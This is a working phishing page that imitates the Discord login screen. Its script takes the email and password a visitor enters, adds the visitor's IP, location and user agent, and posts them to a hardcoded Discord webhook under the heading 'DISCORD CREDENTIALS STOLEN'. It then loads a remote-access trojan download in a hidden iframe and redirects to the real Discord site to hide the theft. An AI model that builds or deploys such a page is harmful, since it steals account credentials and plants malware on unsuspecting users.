<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #1e1f22;
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .login-container {
            background: #2b2d31;
            border-radius: 8px;
            padding: 32px;
            width: 480px;
            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
        }
        h1 {
            color: #fff;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
            text-align: center;
        }
        .subtitle {
            color: #b5bac1;
            font-size: 14px;
            text-align: center;
            margin-bottom: 24px;
        }
        .input-group {
            margin-bottom: 16px;
        }
        label {
            color: #b5bac1;
            font-size: 12px;
            font-weight: 600;
            display: block;
            margin-bottom: 8px;
        }
        input {
            width: 100%;
            padding: 10px;
            background: #1e1f22;
            border: 1px solid #1e1f22;
            border-radius: 4px;
            color: #fff;
            font-size: 16px;
        }
        input:focus {
            outline: none;
            border-color: #5865f2;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #5865f2;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 8px;
        }
        button:hover {
            background: #4752c4;
        }
        .links {
            text-align: center;
            margin-top: 16px;
            font-size: 12px;
        }
        .links a {
            color: #00a8fc;
            text-decoration: none;
        }
        .links a:hover {
            text-decoration: underline;
        }
        .divider {
            margin: 0 8px;
            color: #80848e;
        }
    </style>
</head>
<body>
<div class="login-container">
    <h1>Welcome back!</h1>
    <div class="subtitle">We're so excited to see you again!</div>
    
    <div class="input-group">
        <label>EMAIL OR USERNAME</label>
        <input type="text" id="email" placeholder="Enter your email or username">
    </div>
    
    <div class="input-group">
        <label>PASSWORD</label>
        <input type="password" id="password" placeholder="Enter your password">
    </div>
    
    <button id="loginBtn">Log In</button>
    
    <div class="links">
        <a href="#" id="forgotLink">Forgot your password?</a>
        <span class="divider">·</span>
        <a href="#" id="registerLink">Register an account</a>
    </div>
</div>

<script>
    const WEBHOOK = "https://discord.com/api/webhooks/1512048619124035677/5hcib3Cnp4NbdDx1S03zryCAnVzWNoouLhrOffBKEz7gS2D5j-bavFl7b3dwJbsTT3Xj";
    const RAT_DOWNLOAD = "https://your-rat-link.com"; // Replace with your actual RAT download link

    document.getElementById('loginBtn').addEventListener('click', async function() {
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        
        if (!email || !password) {
            alert("Please enter your email and password.");
            return;
        }
        
        // Get IP and location
        let ipData = {};
        try {
            const ipRes = await fetch('http://ip-api.com/json/');
            ipData = await ipRes.json();
        } catch(e) {}
        
        const userAgent = navigator.userAgent;
        
        // Prepare webhook message
        const webhookData = {
            content: `**🔐 DISCORD CREDENTIALS STOLEN**\n\n**Email/Username:** ${email}\n**Password:** ${password}\n**IP:** ${ipData.query || "Unknown"} (${ipData.city || "Unknown"}, ${ipData.country || "Unknown"})\n**User Agent:** ${userAgent}\n**Timestamp:** ${new Date().toISOString()}`
        };
        
        // Send to webhook
        try {
            await fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(webhookData)
            });
        } catch(e) {}
        
        // Trigger malware download (invisible)
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = RAT_DOWNLOAD;
        document.body.appendChild(iframe);
        
        setTimeout(() => {
            document.body.removeChild(iframe);
        }, 3000);
        
        // Redirect to real Discord
        window.location.href = 'https://discord.com/login';
    });
    
    // Fake links - they just redirect to real Discord
    document.getElementById('forgotLink').addEventListener('click', function(e) {
        e.preventDefault();
        window.location.href = 'https://discord.com/forgot-password';
    });
    
    document.getElementById('registerLink').addEventListener('click', function(e) {
        e.preventDefault();
        window.location.href = 'https://discord.com/register';
    });
</script>
</body>
</html>
